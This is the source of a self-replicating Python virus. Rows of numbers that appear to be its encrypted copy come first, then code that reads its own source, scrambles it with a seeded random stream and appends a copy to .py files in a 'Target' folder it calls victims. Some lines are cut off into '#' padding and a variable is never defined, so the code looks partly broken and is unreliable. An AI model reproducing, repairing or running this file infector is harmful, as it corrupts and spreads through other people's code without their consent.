61	8	43	3	203	2	88	116	235	51	56	161	197	240	105	66	106	135	112	142	204	98	70	193	244	76	21	107	244	207	44	0	225	61	216	60	23	226	37	242	157	94	144	162	219	64	171	67	176	133	101	163	192	213	198	122	205	83	174	206	39	60	213	44
88	248	98	138	215	18	164	152	89	120	170	61	101	232	128	135	163	112	91	143	60	191	196	196	60	117	249	82	194	163	241	24	73	78	158	150	170	118	186	60	28	236	28	148	243	6	74	14	146	152	26	197	131	221	49	251	62	203	121	153	195	223	123	143
1	80	37	82	79	169	121	212	196	84	84	4	175	96	87	117	8	250	126	46	15	207	203	143	61	171	85	42	49	92	20	189	139	85	48	12	148	50	239	97	254	64	65	131	169	172	217	212	248	242	38	208	76	52	180	201	199	95	206	100	159	32	180	5
165	235	235	138	74	190	163	23	34	173	220	175	196	147	70	76	53	176	113	123	208	88	228	49	147	223	187	193	212	4	210	82	186	186	165	29	163	132	225	38	97	206	31	74	255	79	228	159	122	71	186	72	182	208	15	199	111	111	171	192	231	201	108	2
172	236	237	214	141	44	79	37	248	80	252	46	206	10	114	119	125	19	39	238	255	246	193	15	115	53	224	128	221	40	217	231	37	137	72	203	30	172	92	28	76	102	155	2	236	151	240	228	27	206	157	202	232	144	123	31	40	21	85	243	25	85	129	33
47	167	17	98	216	191	248	189	117	164	181	30	59	159	6	250	17	36	235	112	117	250	144	129	186	8	24	87	208	163	127	44	35	104	12	209	28	222	147	39	93	213	111	230	93	75	55	235	91	15	108	135	5	59	172	44	89	84	106	22	147	193	188	190
28	119	84	159	39	102	75	151	32	25	80	61	54	79	74	245	94	113	71	199	54	113	137	186	249	78	90	230	63	29	244	246	169	157	242	101	148	204	153	197	20	196	143	85	139	18	141	4	2	222	2	61	136	97	162	37	167	61	168	220	254	232	58	42
120	14	18	189	22	15	219	0	2	33	88	113	44	105	11	113	6	38	38	123	230	227	239	85	178	133	138	107	44	18	202	111	22	148	251	220	168	7	19	80	123	88	161	34	162	194	87	167	166	200	9	168	235	39	10	172	117	143	144	88	51	218	93	55
198	36	25	148	215	194	193	105	26	121	89	242	71	26	99	143	112	146	90	117	180	230	52	114	181	130	205	118	209	198	29	154	13	185	247	145	121	253	193	16	193	66	204	103	202	54	37	190	86	78	220	93	143	79	224	115	31	22	197	104	4	22	146	150
246	47	154	130	155	70	243	100	172	210	121	27	79	182	9	181	243	137	96	235	15	237	39	117	243	207	39	143	64	26	180	97	220	167	221	189	151	51	161	47	33	71	254	51	236	212	147	170	174	181	65	37	166	222	41	149	102	7	53	196	80	223	52	137
185	163	140	36	38	62	80	252	2	55	225	112	214	73	134	35	188	92	119	82	61	138	138	154	224	181	31	35	69	255	10	119	86	204	30	236	37	244	12	135	50	94	47	172	201	133	127	136	232	96	172	145	138	167	104	220	109	191	78	79	26	188	243	250
202	135	159	155	184	171	230	184	193	204	59	18	209	234	129	215	19	215	182	43	222	39	71	172	184	222	133	167	72	208	226	193	199	88	146	242	189	195	224	163	159	81	200	139	230	175	174	12	186	129	226	36	70	140	174	204	157	75	25	235	178	148	205	167
19	252	49	60	118	247	59	62	141	23	65	187	27	34	239	137	45	27	27	198	109	30	155	176	145	197	132	58	94	223	146	212	69	224	113	121	43	181	151	29	206	6	113	151	105	166	130	114	251	69	63	207	151	201	137	177	29	132	143	161	9	104	103	252
9	29	239	83	83	235	119	170	8	172	146	215	179	110	48	179	214	186	182	236	21	140	13	43	243	116	173	104	3	202	227	135	116	8	43	99	1	243	127	64	160	33	57	24	170	61	77	182	227	125	191	65	92	14	141	82	2	167	196	42	220	215	30	36
15	60	50	252	174	190	174	228	217	39	6	104	124	217	83	75	208	119	112	209	184	251	137	141	230	85	235	35	30	15	176	240	33	109	228	187	22	198	61	189	162	143	62	80	249	1	243	174	136	175	238	153	0	140	147	250	112	202	136	117	14	138	64	22
24	199	14	176	20	216	89	119	119	48	84	177	190	224	22	111	65	202	102	236	57	15	111	14	99	181	151	217	134	78	174	18	183	138	248	2	47	183	86	196	86	43	104	15	73	161	10	222	183	22	34	26	94	69	117	60	75	81	223	245	16	81	237	170
15	186	174	164	99	155	34	1	10	60	255	21	153	128	246	45	160	33	25	39	57	80	117	113	219	149	19	243	212	148	101	62	15	14	50	124	253	114	134	56	89	248	236	93	144	247	162	14	136	71	81	215	19	230	203	175	6	250	90	147	237	62	30	44
93	236	33	221	71	192	127	144	3	41	61	105	249	133	84	72	91	133	192	233	222	111	6	179	34	41	60	253	189	86	63	7	43	181	153	147	92	73	154	49	90	66	23	243	42	232	164	252	118	182	184	55	79	140	70	89	120	76	7	124	133	245	230	227
206	40	48	54	244	76	221	188	220	187	220	88	42	152	86	139	8	72	29	177	176	38	214	142	240	241	49	62	31	73	135	190	251	16	91	253	202	153	117	81	238	152	191	179	81	164	188	32	129	94	228	166	22	157	209	210	38	245	255	132	139	216	49	156
44	109	253	41	216	201	162	31	13	41	210	156	188	86	26	66	53	153	255	211	194	44	238	74	122	165	216	162	106	31	173	250	192	141	228	49	113	110	2	128	101	104	66	29	44	215	226	190	248	191	238	125	113	40	179	11	123	27	247	216	229	77	58	107
91	170	77	126	88	151	58	37	120	38	91	252	141	224	236	144	38	123	110	228	111	220	152	142	186	22	33	198	13	197	236	28	142	232	143	219	53	221	147	202	32	229	213	188	30	161	89	37	162	244	171	90	74	206	84	108	1	139	176	63	143	212	171	46
174	111	107	36	193	157	153	25	131	105	19	99	63	55	106	149	249	213	200	70	38	18	216	123	152	123	160	12	11	243	93	58	176	220	79	73	237	30	135	42	129	27	82	208	218	253	40	159	70	122	163	55	125	77	77	118	7	93	100	10	151	181	83	221
212	177	237	26	170	82	39	15	133	83	222	128	152	58	54	63	198	242	66	68	188	167	222	122	5	112	118	233	146	77	249	141	254	41	18	187	100	43	169	10	116	35	99	98	57	156	50	161	158	67	57	59	196	62	100	98	47	220	160	147	13	100	122	134
24	48	181	149	119	14	17	23	179	7	115	220	42	227	84	137	94	47	73	43	2	102	189	111	91	205	6	23	95	176	199	177	86	65	133	56	204	91	202	56	234	111	104	60	128	215	228	19	245	240	87	85	125	18	59	97	163	236	243	81	189	126	50	240
116	162	111	5	250	121	127	200	122	132	49	142	255	92	255	35	186	136	171	3	243	217	170	212	234	254	115	26	248	158	13	32	194	230	181	153	129	138	225	77	252	179	45	171	60	125	103	203	66	36	21	57	93	133	85	84	49	38	124	155	9	123	57	68
import glob ####################################################
import random ##################################################
from string import * ###########################################
files = glob.iglob('.\Target\*.py') ############################
with open(__file__, 'r') as source_file: #######################
    source = source_file.readlines() ###########################
source_byte = [] ###############################################
line_max = 0 ###################################################
for line in source: ############################################
    vstr = line.find('##########################################
    if vstr!=-1: ###############################################
        line_byte  = [x for x in bytearray(line[:vstr],'utf-8')]
        line_max = max(line_max, len(line_byte))################
        source_byte.append(line_byte) ##########################
random.seed(17) ################################################
for line in source_byte:########################################
    line.extend([35 for i in  range(line_max - len(line))])#####
    for i in range(len(line)):##################################
        line[i] = (line[i] + random.randrange(0,256))%256#######
for file in files: #############################################
    with open(file,'r') as victim: #############################
        victim_read = victim.read() ############################
    if victim_read.find('#######################################
        with open(file,'a') as victim: #########################
            victim.write(my_copy) ##############################
